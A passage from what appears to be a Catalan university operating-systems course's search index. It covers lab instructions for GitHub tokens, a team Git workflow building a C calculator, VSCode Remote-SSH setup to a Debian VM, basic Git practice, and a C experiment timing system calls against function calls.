comanda.\n\n\n\n\n\n\nAlertaNota:\n\n\n\nGithub ja no permet l’ús de contrasenyes per a operacions Git que requereixen autenticació. En lloc d’això, has de fer servir un token d’accés personal (PAT) per autenticar-te quan fas operacions com git push o git pull en repositoris remots. Per tant, és important que utilitzis el token d’accés personal que has generat en lloc de la teva contrasenya habitual quan se’t demani autenticació des d’una línia de comandes o des d’un IDE com VSCode.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 5 · Calculadora col·laborativa amb C"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab05.html#configurant-github",
    "href": "labs/01-introduction/lab05.html#configurant-github",
    "title": "Laboratori 5: Calculadora col·laborativa",
    "section": "",
    "text": "Crea un compte a GitHub: Si no tens un compte a GitHub, visita https://github.com/ i crea un compte gratuït.\n\n\n\nInicia la sessió al teu compte de GitHub en el navegador web.\nFes clic a la teva foto de perfil a la cantonada superior dreta i selecciona Configuració al menú desplegable.\nA la pàgina de configuració de GitHub, selecciona Configuració de desenvolupador al menú lateral esquerre.\nA la secció Tokens personals, fes clic a Genera un token personal i selecciona un Token (clássic) per a l’ús amb la línia de comandes.\n\n\n\n\nGenerar token\n\n\nEn aquest punt completa la informació requerida i fes clic a Generar token:\n\nIntrodueix un nom per al teu token.\n\n\n\n\n\n\n\nNotaPer exemple:\n\n\n\nToken per a la màquina virtual del curs 2526 de Sistemes Operatius\n\n\n\nSelecciona els permisos que necessites per al teu token. Per a la majoria de les operacions bàsiques, com ara clonar repositoris i fer push, necessitaràs almenys els permisos següents:\n\nrepo (per accedir als repositoris privats i públics)\nworkflow (per executar workflows de GitHub Actions)\nwrite:packages (per pujar paquets a GitHub Packages)\n\nSelecciona una data de caducitat per al teu token. És recomanable establir una data de caducitat per motius de seguretat.\n\n\n\n\n\n\n\nNotaPer exemple:\n\n\n\nPots seleccionar Custom i posar fins al 01/02/2026 on ja haurà acabat el curs.\n\n\n\n\n\n\nInicia una sessió a la terminal de la màquina virtual com a usuari normal.\nConfigura Git per utilitzar el token de GitHub executant la següent comanda:\ngit config --global github.token TOKEN\n\n\n\n\n\n\nConsellImportant:\n\n\n\nAssegura’t de substituir TOKEN pel token d’accés personal que has generat a GitHub. Això emmagatzemarà el token de GitHub en la configuració global de Git al teu sistema Debian.\n\n\nVerifica que el token s’hagi configurat correctament executant:\ngit config --global --get github.token\n\nSi tot ha anat bé, veuràs el token que has configurat a la sortida d’aquesta comanda.\n\n\n\n\n\n\nAlertaNota:\n\n\n\nGithub ja no permet l’ús de contrasenyes per a operacions Git que requereixen autenticació. En lloc d’això, has de fer servir un token d’accés personal (PAT) per autenticar-te quan fas operacions com git push o git pull en repositoris remots. Per tant, és important que utilitzis el token d’accés personal que has generat en lloc de la teva contrasenya habitual quan se’t demani autenticació des d’una línia de comandes o des d’un IDE com VSCode.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 5 · Calculadora col·laborativa amb C"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab05.html#tasques",
    "href": "labs/01-introduction/lab05.html#tasques",
    "title": "Laboratori 5: Calculadora col·laborativa",
    "section": "Tasques",
    "text": "Tasques\n\nCreació d’equips\n\nFormeu equips de 3 persones. Cada grup haurà d’escollir un líder, que serà el responsable de coordinar el treball, gestionar el repositori i fer el seguiment del projecte.\nTrieu un nom d’equip original.\n\n\n\nPreparació del projecte\nEnllaç de la tasca a GitHub Classroom: https://classroom.github.com/a/bxb1jFbT\n\nEl líder de l’equip haurà d’iniciar el grup a través de GitHub Classroom.\n\nIntrodueix el nom de l’equip.\n\nAccepta la tasca.\n\nUn cop acceptada la tasca, es crearà un repositori per a l’equip.\n\n\nLa resta de membres s’hi podran unir seleccionant el nom de l’equip al mateix enllaç https://classroom.github.com/a/bxb1jFbT.\nEl repositori base contindrà el codi inicial necessari i la seva estructura.\n\nEl líder és responsable d’assignar les tasques a cada membre mitjançant issues a GitHub.\nPer fer-ho:\n\nFer clic a la pestanya Issues.\n\nFer clic a New issue, i seleccionar Feature request.\n\nUs he preparat una plantilla per a les issues. Feu clic a Get started.\n\nOmplir el títol i la descripció de la tasca.\nAssignar la tasca a un membre de l’equip. Click a Assignees i seleccionar el membre.\nUn cop assignada la tasca, fer clic a Submit new issue.\n\nLlista de tasques i assignació:\n\n\n\nTasca\nAssignat a\n\n\n\n\nImplementació de la funció de suma\nlíder\n\n\nImplementació de la funció de resta\nlíder\n\n\nImplementació de la funció de multiplicació\nmembre1\n\n\nImplementació de la funció de divisió\nmembre1\n\n\nImplementació de la funció de potència\nmembre2\n\n\nImplementació de la funció de arrels quadrades\nmembre2\n\n\n\n\n\n\nTreball individual\nInstal·la el paquet build-essential, que inclou les eines i llibreries necessàries per compilar i construir programes en C. Aquest paquet inclou el compilador GCC, que és comunament utilitzat per programar en C.\napt install build-essential -y\n\nCada membre de l’equip haurà de clonar el repositori al seu ordinador i crear una branca develop per les seves tasques.\ngit clone URL_DEL_REPOSITORI\ncd NOM_DEL_REPOSITORI\n\n\n\n\n\n\n\nNota\n\n\n\nSi feu clic a Code al repositori, podreu copiar la URL del repositori. \n\n\n\n\n\n\n\n\nConsellRecomanació:\n\n\n\nTanqueu la sessió de VSCode i torneu-la a obrir però indicant la ruta a la carpeta del projecte. En el meu cas, seria /home/jordi/test/projecte-0-calculadora-teacher. D’aquesta manera, podreu utilitzar les eines de VSCode per a desenvolupar el projecte.\n\n\n\n\n\nPer cada tasca assignada, el membre haurà de crear una branca amb el nom de la tasca. Per exemple, si la tasca és implementar la funció de suma, la branca es podria anomenar feature-suma.\ngit checkout -b feature-suma\nObserveu que VSCode us mostra la branca actual a la part inferior esquerra.\n\n\n\nEl codi de la funció suma podria ser:\n// calc.c\nint suma(int a, int b) {\n    return a + b;\n}\n// calc.h\nint suma(int a, int b);\nReviseu el fitxer src/main.c per a cridar la funció sumacorrectament de la llibreria calc.\nCompileu el codi i comproveu que funciona correctament.\nmake\n./bin/calc\n\n\n\n\n\n\n\n\nConsellNota:\n\n\n\nSi tot funciona correctament, el codi s’executarà i mostrarà el resultat de la suma.\n\n\n\nUn cop finalitzada la tasca, fer un commit amb els canvis realitzats indicant la tasca realitzada. Teniu dos opcions per fer el commit:\n\nAmb les eines de VSCode: Feu clic a la icona de la branca a la part inferior esquerra i seleccioneu Commit. Després, introduïu el missatge de commit i confirmeu-lo.\n\n\n\nAmb la terminal.\ngit add src/calc.c src/calc.h src/main.c\ngit commit -m \"@feat: Implementació de la funció de suma\"\n\n\n\n\n\n\n\n\n\nAlerta\n\n\n\nSi no feu git add abans de fer el commit, no es pujaran els canvis al repositori. Així que assegureu-vos de fer git add abans de fer el commit.\n\n\n\n\n\n\n\n\n\nConsell\n\n\n\nUtilitza els missatges de commit per tancar les issues relacionades amb la tasca. Per exemple, si la tasca és implementar la funció de suma, el missatge de commit podria ser: git commit -m \"@feat: Implementació de la funció de suma. Closes #1\". Si la tasca 1 és la implementació de la funció de suma.\n\n\nRepeteix els passos 2 i 3 per a cada tasca assignada. Sempre creant la branca des de main. Per tornar a la branca main, feu git checkout main. O bé, click a la branca a la part inferior esquerra de VSCode i seleccioneu main. Un cop finalitzades les seves tasques ajuntarem totes les branques a la nostra branca local main.\ngit checkout -b main\ngit merge feature-suma \n\n\n\n\n\n\n\nAlertaImportant:\n\n\n\nSi hi ha conflictes, caldrà resoldre’ls abans de fer el commit.\n\nPer fer-ho amb VSCode, farem clic a la icona de la branca a la part inferior esquerra i seleccionarem Merge branch into current. \nSeleccioneu la branca a ajuntar. \nQuan integreu la segona funcionalitat (resta, multiplicació, etc.), caldrà fer un merge ja que es detectaran conflictes. \nUn dels conflictes es el fitxer calc.c. Cada branca ha modificat aquest fitxer i caldrà resoldre els conflictes. Acceptant els canvis de les dues branques. Podeu fer-ho manualment o amb el resolutor de conflictes de VSCode. \nRepetiu el mateix procediment per tots els conflictes que apareguin.\nUn cop resolts els conflictes, feu un commit amb el missatge @feat: Merge branch feature-resta.\n\n\n\n\n\n\n\n\n\n\nConsellNota:\n\n\n\nEn aquest punt, cada membre de l’equip haurà de tenir implementades les seves tasques (resta, multiplicació, divisió, potència i arrels quadrades), per poder després ajuntar-les a la branca main. Es important editar els fitxers calc.c i calc.h i també el fitxer main.c per a cridar les funcions correctament.\n\n\n\n\nAjuntar les tasques\n\nUn cop totes les tasques estiguin implementades i ajuntades a la branca main, caldrà testar que el codi funciona correctament.\nAquestes tasques estaràn en la branca main del repositori local. Ara caldrà pujar aquestes tasques al repositori remot.\n\nCrea a GitHub una branca remota anomenada develop-&lt;nom-usuari&gt; i la vincularem amb la branca main local. \n\nPrimer, caldrà actualitzar les branques remotes del repositori.\ngit fetch origin\n\nUn cop actualitzades les branques remotes, caldrà fer un push de la branca main a la branca develop-&lt;nom-usuari&gt;.\ngit push origin main:develop-&lt;nom-usuari&gt;\nUn cop pujades totes les tasques al repositori remot, el líder actualitzarà les branques remotes de tots els membres de l’equip.\ngit fetch origin\nFara un merge de totes les tasques a la seva branca main.\nFinalment, testeu que el codi funciona correctament.\nUn cop testejat, caldrà pujar la branca main al repositori remot.\ngit push origin main\n\n\n\nDocumentació\n\nEditeu el fitxer README.md i afegiu una breu descripció del projecte, el nom dels membres de l’equip i una captura de pantalla de la calculadora en funcionament.\nAfegiu també les instruccions per a compilar i executar el projecte.\n\nPodeu consultar la documentació de GitHub sobre com escriure aquest tipus de documents https://docs.github.com/en/github/writing-on-github/basic-writing-and-formatting-syntax.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 5 · Calculadora col·laborativa amb C"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab05.html#exercici-extra-opcional",
    "href": "labs/01-introduction/lab05.html#exercici-extra-opcional",
    "title": "Laboratori 5: Calculadora col·laborativa",
    "section": "Exercici Extra (opcional)",
    "text": "Exercici Extra (opcional)\nPodeu intentar superar els nivells del joc Learn Git Branching per practicar més les vostres habilitats amb Git. Centreu-vos en els exercicis REMOTE.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 5 · Calculadora col·laborativa amb C"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab02.html",
    "href": "labs/01-introduction/lab02.html",
    "title": "Laboratori 2: Configurant el meu entorn de desenvolupament amb VSCode",
    "section": "",
    "text": "Configurar el Visual Studio Code (VSCode) per connectar-se a la màquina virtual mitjançant SSH.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 2 · Configurant el meu entorn de desenvolupament amb VSCode"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab02.html#objectius",
    "href": "labs/01-introduction/lab02.html#objectius",
    "title": "Laboratori 2: Configurant el meu entorn de desenvolupament amb VSCode",
    "section": "",
    "text": "Configurar el Visual Studio Code (VSCode) per connectar-se a la màquina virtual mitjançant SSH.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 2 · Configurant el meu entorn de desenvolupament amb VSCode"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab02.html#requisits-previs",
    "href": "labs/01-introduction/lab02.html#requisits-previs",
    "title": "Laboratori 2: Configurant el meu entorn de desenvolupament amb VSCode",
    "section": "Requisits previs",
    "text": "Requisits previs\n\nMàquina virtual en funcionament (vegeu Laboratori 1).\nVisual Studio Code (VSCode) instal·lat al vostre ordinador. Podeu descarregar-lo des de https://code.visualstudio.com/.\nObtenir la IP de la màquina virtual. Per fer-ho, podeu:\n\nConsultar la informació a VMWare: \nO bé, iniciar sessió a la màquina virtual i executar la comanda ip a per obtenir la IP: \n\n\n\n\n\n\n\nNota\n\n\n\nEn els dos casos, la IP de la màquina virtual és 172.16.10.223.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 2 · Configurant el meu entorn de desenvolupament amb VSCode"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab02.html#configurant-vscode-per-connectar-se-a-la-màquina-virtual",
    "href": "labs/01-introduction/lab02.html#configurant-vscode-per-connectar-se-a-la-màquina-virtual",
    "title": "Laboratori 2: Configurant el meu entorn de desenvolupament amb VSCode",
    "section": "Configurant VSCode per connectar-se a la màquina virtual",
    "text": "Configurant VSCode per connectar-se a la màquina virtual\nUn cop hagueu instal·lat el vostre entorn de desenvolupament (IDE), podeu afegir les següents extensions utilitzant el marketplace de VSCode: remote-ssh. Primer, feu clic a Marketplace (1), després cerqueu remote-ssh i, finalment, feu clic a (3) per instal·lar la extensió. Consulteu la imatge:\n\nUn cop hagueu instal·lat la extensió, ja podeu connectar-vos a la màquina virtual. Per fer-ho, feu clic a la icona de la part inferior esquerra (1) i seleccioneu l’opció Remote-SSH: Connect to Host… (2). Consulteu la imatge:\n\nAra apareixerà una finestra on podreu escriure la connexió SSH. També veureu l’opció Add a New SSH Host. Feu clic en aquesta opció i introduïu la comanda SSH per connectar-vos a la màquina virtual. Consulteu la imatge:\n\nSeleccioneu la primera opció del menú desplegable amb la ruta del vostre usuari i feu clic a Add. Consulteu la imatge:\n\ni comproveu que l’amfitrió s’ha afegit correctament.\n\nAra feu clic a Open Config i observeu que s’ha creat una nova entrada amb el vostre usuari i la IP de la màquina virtual:\nHost 172.16.10.223\n  HostName 172.16.10.223\n  User jordi\nUs recomano que modifiqueu el fitxer de configuració perquè sigui més fàcil de recordar. Per exemple, podeu canviar el nom de l’amfitrió per vm-curs0-debian12 :\nHost vm-curs0-debian12\n  HostName 172.16.10.202\n  User jordi\nUn cop hagueu modificat el fitxer de configuració, guardem-lo i tanquem-lo. Ara ja podeu connectar-vos a la màquina virtual vm-curs0-debian12. Per fer-ho:\n\nFeu clic a la icona de la part inferior esquerra.\nSeleccioneu Remote-SSH: Connect to Host….\nSeleccioneu vm-curs0-debian12:\n\n\nUs apareixerà una finestra emergent que us demanarà si voleu confiar en l’amfitrió. Feu clic a Continue. \nUs apareixerà una altra finestra emergent que us demanarà la contrasenya de l’usuari jordi. \n\n\n\n\n\n\n\nNota\n\n\n\nLa primera vegada que us connecteu a la màquina virtual, VSCode instal·larà el servidor remot a la màquina virtual. Això pot trigar uns minuts.\n\n\nUn cop us hàgiu connectat, veureu que la finestra de VSCode ha canviat i que ara esteu treballant a la màquina virtual. Podeu comprovar-ho a la part inferior esquerra on apareix el nom de l’amfitrió vm-curs0-debian12.\n\nPer comprovar que tot funciona correctament, podeu obrir una terminal integrada a VSCode i executar la comanda uname -a per veure la informació del sistema i comprovar que esteu a la màquina virtual.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 2 · Configurant el meu entorn de desenvolupament amb VSCode"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab04.html",
    "href": "labs/01-introduction/lab04.html",
    "title": "Laboratori 4: Configurant Git a la màquina virtual",
    "section": "",
    "text": "Instal·lar i configurar Git a la màquina virtual.\nReplicar l’exemple de les diapositives utilitzant Visual Studio Code (VSCode) i Git.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 4 · Configurant Git a la màquina virtual"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab04.html#objectius",
    "href": "labs/01-introduction/lab04.html#objectius",
    "title": "Laboratori 4: Configurant Git a la màquina virtual",
    "section": "",
    "text": "Instal·lar i configurar Git a la màquina virtual.\nReplicar l’exemple de les diapositives utilitzant Visual Studio Code (VSCode) i Git.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 4 · Configurant Git a la màquina virtual"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab04.html#requisits-previs",
    "href": "labs/01-introduction/lab04.html#requisits-previs",
    "title": "Laboratori 4: Configurant Git a la màquina virtual",
    "section": "Requisits previs",
    "text": "Requisits previs\n\nMàquina virtual en funcionament (vegeu Laboratori 1).\nVisual Studio Code (VSCode) connectat a la màquina virtual mitjançant SSH (vegeu Laboratori 2).",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 4 · Configurant Git a la màquina virtual"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab04.html#installació-de-git-a-la-màquina-virtual",
    "href": "labs/01-introduction/lab04.html#installació-de-git-a-la-màquina-virtual",
    "title": "Laboratori 4: Configurant Git a la màquina virtual",
    "section": "Instal·lació de Git a la màquina virtual",
    "text": "Instal·lació de Git a la màquina virtual\n\nConnecteu VSCode a la màquina virtual mitjançant SSH (vegeu Laboratori 2).\nInicia la sessió de l’usuari root amb la comanda:\nsu -\nEl guionet - és important perquè carregui correctament les variables d’entorn de l’usuari root.\nCom a usuari root. Instal·la el programari git amb la comanda:\napt install git -y\nUn cop finalitzi la instal·lació, comproveu la versió de git amb la comanda:\ngit --version\nSortiu de la sessió de l’usuari root amb la comanda:\nexit",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 4 · Configurant Git a la màquina virtual"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab04.html#configuració-de-git",
    "href": "labs/01-introduction/lab04.html#configuració-de-git",
    "title": "Laboratori 4: Configurant Git a la màquina virtual",
    "section": "Configuració de Git",
    "text": "Configuració de Git\nPer començar a treballar amb Git, primer cal configurar el nostre usuari i correu electrònic. Aquesta informació s’utilitzarà per identificar els commits que fem al repositori. Per configurar el nostre usuari i correu electrònic, executem les següents comandes:\ngit config --global user.name \"JordiMateo\"\ngit config --global user.email \"jordi.mateo@udl.cat\"",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 4 · Configurant Git a la màquina virtual"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab04.html#replicació-de-lexemple",
    "href": "labs/01-introduction/lab04.html#replicació-de-lexemple",
    "title": "Laboratori 4: Configurant Git a la màquina virtual",
    "section": "Replicació de l’exemple",
    "text": "Replicació de l’exemple\n\nCrearem un repositori nou anomenat projecte-final:\nmkdir projecte-final\nAccedim al directori del projecte:\ncd projecte-final\no bé podeu fer click a Obre la carpeta a VSCode i seleccionar el directori projecte-final.\n\nCrearem els 3 fitxers (treball.txt, figura1.png, figura2.png) i els afegirem al directori de treball:\necho \"Aquest és el fitxer de treball.\" &gt; treball.txt\ntouch figura1.png figura2.png\n\nAra inicialitzarem el repositori Git:\ngit init\n\no bé, podeu fer click a la icona de Git a la barra lateral esquerra de VSCode i fer click a Inicia el repositori Git.\n\n\n\n\n\n\n\nNota\n\n\n\n\nSi feu anar la línia de comandes, haures de posar els fitxers a la caixa d’espera (staging area) manualment. git add . afegeix tots els fitxers del directori actual a la caixa d’espera.\nSi feu servir la eina integrada de Git a VSCode, us apareixerà una finestra emergent que us demanarà si voleu afegir tots els fitxers a la caixa d’espera (staging area). Feu click a Yes.\n\n\n\n\nSi us fixeu, veureu que VSCODE us indica que hi ha 3 fitxers nous que encara no s’han confirmat (posats al camió de mudances).\n\n\n\nAra farem el primer commit amb el missatge “Primer commit: Afegits els fitxers inicials”. Podeu fer-ho des de la línia de comandes:\ngit commit -m \"Primer commit: Afegits els fitxers inicials\"\no bé, podeu fer click a la icona de Git a la barra lateral esquerra de VSCode, escriure el missatge del commit i fer click a la icona de check (✓) per confirmar els canvis.\n\n\n\n\n\n\n\n\nNota\n\n\n\nObserveu que després de fer el commit, els fitxers ja no apareixen a la secció de canvis pendents (Changes). I teniu la linia temporal inicialitzada amb un commit.\n\n\n\n\nFarem un canvi al fitxer treball.txt:\necho \"Afegit la introducció.\" &gt;&gt; treball.txt\n\nCom el document treball.txt ja està a la caixa d’espera, només cal que fem un nou commit:\ngit commit -am \"Segon commit: Afegida la introducció al fitxer de treball\"\n\nAra podem veure l’historial dels commits fets fins ara:\ngit log\n\nPodem tornar a una versió anterior si cal. Per exemple, per tornar al primer commit:\ngit checkout HEAD~1\no bé, utilitzant VSCODE i fent click a la icona de Git a la barra lateral esquerra, després a la pestanya d’Historial (History) i fent click dret al commit on volem tornar i seleccionant l’opció Checkout.\n\n\n\n\n\n\n\n\nNota\n\n\n\nQuan fem un checkout a una versió anterior, el directori de treball es posa en la versió seleccionada, ara ja no tenim el text “Afegit la introducció.” al fitxer treball.txt. Això és perquè hem tornat a la versió anterior on aquest canvi no existia.\n\n\n\nPer tornar a la versió més recent, fem:\ngit checkout main\n\n\n\n\n\n\n\n\nNota\n\n\n\nQuan fem un checkout a la versió més recent, el directori de treball es torna a la versió més nova, i ara tornem a tenir el text “Afegit la introducció.” al fitxer treball.txt.\n\n\n\nAra podem crear una branca nova per treballar en una nova funcionalitat:\ngit checkout -b metodologia\no bé, utilitzant VSCODE i fent click a la icona de Git a la barra lateral esquerra, després a la part inferior esquerra on apareix el nom de la branca actual (main) i fent click a Create new branch.\n\nFarem un canvi al fitxer treball.txt a la branca metodologia:\necho \"Afegida la secció de metodologia.\" &gt;&gt; treball.txt\n\nFem un commit amb aquest canvi:\ngit commit -m \"Afegida la secció de metodologia al fitxer de treball\"\nPodem veure les branques existents:\ngit branch\n\nPer tornar a la branca principal:\ngit checkout main\nPer anar a la branca metodologia:\ngit checkout metodologia\nTambé podem fusionar la branca metodologia a la branca main:\ngit checkout main\ngit merge metodologia\n\n\nAmb això hem explorat les funcionalitats bàsiques de Git. Podeu continuar experimentant amb més canvis, branques i commits per familiaritzar-vos amb el flux de treball de Git.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 4 · Configurant Git a la màquina virtual"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab04.html#exercici-extra-opcional",
    "href": "labs/01-introduction/lab04.html#exercici-extra-opcional",
    "title": "Laboratori 4: Configurant Git a la màquina virtual",
    "section": "Exercici Extra (opcional)",
    "text": "Exercici Extra (opcional)\nPodeu intentar superar els nivells del joc Learn Git Branching per practicar més les vostres habilitats amb Git. Centreu-vos en els exercicis MAIN.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 4 · Configurant Git a la màquina virtual"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab02.html",
    "href": "labs/03-syscalls/lab02.html",
    "title": "Laboratori 8: Analitzant les crides a sistema",
    "section": "",
    "text": "Les crides a sistema són la interfície entre els programes d’usuari i el nucli del sistema operatiu. Aquestes crides són les que permeten als programes d’usuari accedir a les funcionalitats del sistema operatiu. En aquest laboratori, analitzarem la complexitat de les crides a sistema i les compararem amb les crides a procediments.\nLes preguntes que ens fem són:",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 8 · Anàlisi de crides a sistema"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab02.html#objectius",
    "href": "labs/03-syscalls/lab02.html#objectius",
    "title": "Laboratori 8: Analitzant les crides a sistema",
    "section": "Objectius",
    "text": "Objectius\n\nComprendre el funcionament de les crides a sistema.\nComparar el cost d’una crida a sistema amb el cost d’una crida a procediment.\nDissenyar experiments en C.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 8 · Anàlisi de crides a sistema"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab02.html#tasca",
    "href": "labs/03-syscalls/lab02.html#tasca",
    "title": "Laboratori 8: Analitzant les crides a sistema",
    "section": "Tasca",
    "text": "Tasca\nPer respondre a les preguntes plantejades, dissenyarem un experiment en C que ens permeti mesurar el temps que triga una crida a sistema i una crida a procediment. Aquest experiment consistirà en cridar una funció simple i una crida a sistema un nombre determinat de vegades, i mesurar el temps que triga aquestes crides. Per exemple, podem utiltizar una crida a sistema com getpid() i una funció simple com funcio() que retorna un valor constant i calcular el temps que triga aquestes crides. Com a tota experimentació, caldrà repetir l’experiment un nombre suficient de vegades per obtenir resultats significatius, per exemple, 1000000 vegades i calcular el temps mitjà de cada crida.\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n#include &lt;unistd.h&gt;\n\n#define N_ITERATIONS 1000000\n\nint funcio() {\n    return 20;\n}\n\nint main() {\n\n    struct timespec start, end;\n    double totalTimeSysCall, totalTimeFuncCall;\n    float avgTimeSysCall, avgTimeFuncCall;\n\n    clock_gettime(CLOCK_MONOTONIC, &start);\n    for (int i = 0; i &lt; N_ITERATIONS; i++) {\n        funcio();\n    }\n    clock_gettime(CLOCK_MONOTONIC, &end);\n\n    totalTimeFuncCall = (end.tv_nsec - start.tv_nsec);\n    avgTimeFuncCall = totalTimeFuncCall / N_ITERATIONS;\n\n    printf(\"Temps mitjà de la funció: %f ns\\n\", avgTimeFuncCall);\n\n\n    clock_gettime(CLOCK_MONOTONIC, &start);\n    for (int i = 0; i &lt; N_ITERATIONS; i++) {\n        getpid();\n    }\n    clock_gettime(CLOCK_MONOTONIC, &end);\n\n    totalTimeSysCall = (end.tv_nsec - start.tv_nsec);\n    avgTimeSysCall = totalTimeSysCall / N_ITERATIONS;\n\n    printf(\"Temps mitjà de la crida a sistema: %f ns\\n\", avgTimeSysCall);\n\n    return 0;\n}\nEn aquest codi, s’utilitza la funció clock_gettime() per mesurar el temps que triga una crida a sistema i una crida a procediment. Aquesta funció ens retorna una estructura timespec que conté el temps en segons i nanosegons (tv_sec o tv_nsec). Per a més informació, podeu consultar el manual de linux man clock_gettime o man timespec.\nPer tal d’obtenir el temps transcorregut entre dues crides, es calcula la diferència entre el temps final i el temps inicial. Per tant, definim dues variables start i end de tipus timespec que contindran el temps abans i després de les crides. El temps total de les crides es calcula restant el temps final i el temps inicial. Finalment, es calcula el temps mitjà de les crides dividint el temps total pel nombre de crides realitzades.\n\nNota: En aquest exemple, he simplificat el càlcul del temps per a facilitar la comprensió i per que cada mesura no excedira el segon. Si es vol fer una mesura més universal, es recomana utilitzar la següent fórmula: totalTime = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9. Ja que cada segon, la variable tv_sec incrementa en 1 i la variable tv_nsec es reinicia a 0. Això permet mesurar temps superiors a 1 segon.\n\n\n\nNota: La variable CLOCK_MONOTONIC segons el manual de linux mesura el temps de forma monòtona, és a dir, no es veu afectada per salts discontinus en el temps del sistema.\n\nPer executar aquest experiment, compilem el codi amb la següent comanda:\ngcc experiment.c -o experiment -o0\nAfegim l’opció -o0 per desactivar l’optimització del compilador i obtenir resultats més precisos. El compilador de C, sovint optimitza el codi i això pot afectar als resultats. Per tant, desactivem l’optimització per obtenir resultats més fiables.\nUn cop compilat, executem el programa amb la següent comanda:\n./experiment\nTemps mitjà de la funció: 5.298092 ns\nTemps mitjà de la crida a sistema: 142.388794 ns\nCom a resultat de l’experiment, es mostrarà el temps mitjà de la crida a sistema és molt més gran que el temps mitjà de la crida a procediment. Això és degut a la complexitat de les crides a sistema, que involucren moltes més operacions que una crida a procediment. Recordeu que les crides a sistema impliquen accedir al mode kernel, canviar de context, executar la crida a sistema i tornar al mode d’usuari, mentre que una crida a procediment és simplement una crida a una funció.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 8 · Anàlisi de crides a sistema"
    ]
  },
  {
    "objectID": "labs/03-syscalls/lab02.html#exercicis-opcionals",
    "href": "labs/03-syscalls/lab02.html#exercicis-opcionals",
    "title": "Laboratori 8: Analitzant les crides a sistema",
    "section": "Exercicis opcionals",
    "text": "Exercicis opcionals\n\nOptimitza l’experiment per evitar repeticions de codi.\nOptimitza la mesura del temps per obtenir resultats més generals aplicant la fórmula recomanada.\nModifica aquest experiment per comparar altres funcions i crides a sistema.\nCrea un makefile per compilar el codi de forma més eficient.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 8 · Anàlisi de crides a sistema"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#esquema-sense-virtualització",
    "href": "labs/01-lab-introduction.html#esquema-sense-virtualització",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "Esquema sense virtualització",
    "text": "Esquema sense virtualització",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#esquema-amb-virtualització",
    "href": "labs/01-lab-introduction.html#esquema-amb-virtualització",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "Esquema amb virtualització",
    "text": "Esquema amb virtualització",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#laboratori-1-objectiu",
    "href": "labs/01-lab-introduction.html#laboratori-1-objectiu",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "Laboratori 1: Objectiu",
    "text": "Laboratori 1: Objectiu\n\nUna màquina virtual amb Debian 12 comparint recursos amb el vostre ordinador físic.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#laboratori-1-tasques",
    "href": "labs/01-lab-introduction.html#laboratori-1-tasques",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "Laboratori 1: Tasques",
    "text": "Laboratori 1: Tasques\n\nInstal·lar un hypervisor: VMWare Workstation Pro o VMWare Fusion.\nDesplegar una màquina virtual amb Linux dins de l’hypervisor.\n\n\n📄 Laboratori 1: Instal·lació de Debian 12",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#laboratori-2-objectiu",
    "href": "labs/01-lab-introduction.html#laboratori-2-objectiu",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "Laboratori 2: Objectiu",
    "text": "Laboratori 2: Objectiu\n\nConnectar VSCode que s’executa a la màquina real per executar i comunicar-se amb la màquina virtual via SSH.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#laboratori-2-tasques",
